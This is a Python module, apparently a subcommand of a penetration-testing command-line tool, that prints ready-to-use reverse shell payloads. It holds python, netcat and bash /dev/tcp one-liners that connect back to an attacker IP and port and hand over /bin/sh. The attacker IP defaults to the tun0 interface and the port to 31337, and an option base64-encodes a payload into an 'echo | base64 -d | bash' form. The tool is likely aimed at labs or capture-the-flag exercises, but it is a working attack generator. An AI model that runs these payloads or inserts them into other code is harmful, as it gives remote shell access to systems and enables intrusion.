import os
import socket
import fcntl
import struct
from base64 import b64encode


SUPPORTED_SHELLS_DICT = {
    "python2":"""python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<ATTACKER-IP>",<PORT>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'""", 
    "python3":"""python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<ATTACKER-IP>",<PORT>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'""",
    "nc":"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <ATTACKER-IP> <PORT> >/tmp/f",
    "nce": "nc -e /bin/sh <ATTACKER-IP> <PORT>",
    "bash": "bash -c 'bash -i >& /dev/tcp/<ATTACKER-IP>/<PORT> 0>&1'"
}

def add_parser(sub_parsers) -> None:
    shell_parser = sub_parsers.add_parser("shell")
    shell_parser.add_argument("shell_type", choices=SUPPORTED_SHELLS_DICT.keys(), help="Type of shell")
    shell_parser.add_argument("-b", "--base64", dest="encode", action="store_true", help="Encode the payload as base64", default=False)
    shell_parser.add_argument("-p", "--port", dest="port", help="Change listening port", default=31337)
    shell_parser.add_argument("-l", "--ip", "--lhost", dest="lhost", help="Change target IP", default=_get_ip_address("tun0"))


def main(shell_type: str, encode: bool=False, port: int=31337, lhost: str=None) -> None:
    shell = _fill_placeholders(SUPPORTED_SHELLS_DICT[shell_type], lhost, port)
    
    if encode:
        shell = _encode_shell(shell.encode("utf-8"))

    print(shell)

def _get_ip_address(ifname: str) -> str:
    ifname = bytes(ifname, 'utf-8')
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    return socket.inet_ntoa(fcntl.ioctl(
        s.fileno(),
        0x8915,  # SIOCGIFADDR
        struct.pack('256s', ifname[:15])
    )[20:24])

def _fill_placeholders(shell:str, lhost: str, port: int):
    shell = shell.replace("<ATTACKER-IP>", lhost)
    shell = shell.replace("<PORT>", str(port))
    return shell

def _encode_shell(shell: str) -> str:
    return f"echo {b64encode(shell).decode('utf-8')} | base64 -d | bash"
